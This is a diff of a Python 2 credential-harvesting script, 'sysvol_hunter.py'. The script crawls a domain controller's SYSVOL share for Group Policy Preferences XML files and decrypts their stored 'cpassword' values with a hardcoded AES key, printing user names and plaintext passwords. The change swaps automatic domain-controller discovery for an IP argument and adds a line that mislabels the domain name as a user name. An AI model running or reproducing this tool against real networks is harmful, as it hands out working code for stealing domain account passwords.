@@ -3,14 +3,16 @@
 #description     : Automate finding and cracking sysvol passwords
 #author          : Marouane El-ANBRI (Iron Geek)
 #python_version  : 2.7.x
-#Usage           : python sysvol_hunter.py
+#Usage           : python sysvol_hunter.py DC_IP
  
 import os
-import re
 import socket
+from sys import argv
 from bs4 import BeautifulSoup
 from Crypto.Cipher import AES
 from base64 import b64decode
+
+script,ip = argv
  
 def decrypter(cpassword):
     key = "4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b".decode('hex')
@@ -22,23 +24,11 @@ def decrypter(cpassword):
  
 print "[+] Detecting Domain Name... "
 domain_name = socket.getfqdn().partition('.')[2]
-os.system('nltest /dclist:%s > test.txt'%domain_name)
-pattern=re.compile(r'([\w.]+\.[\w.]+\.[\w.]+)+')
-dc=[]
-ip_dc=[]
-dc_file = open("test.txt", 'r')
-for line in dc_file:
-    dc += pattern.findall(line)
-dc_file.close()
-print "\n[+] Domain Name    : %s" %domain_name
-print "[+] Finding Possible Domain Controllers..."
-for i in dc:
-    ip_dc.append(socket.gethostbyname(i))
-os.remove("test.txt")
-print"[+] Testing :%s" %dc[0]
+print "[+] User Name Found    : %s" %domain_name
+
 path=[]
 name=[]
-sr_path = r'\\'+i+r'\sysvol'
+sr_path = r'\\'+ip+r'\sysvol'
 for root, dirs, files in os.walk(sr_path):
     for file in files:
         if file.endswith('.xml'):
@@ -61,5 +51,6 @@ for f_name,f_dir in zip(name,path):
             print "[+] User Name Found    : %s" %user_name
             print "[+] CPassword Found    : %s" %cpass
             print "[+] Password Decrypted : %s" %fn
+        
         else:
-            print "\n[-] %s File has No Password" %f_name
+            pass
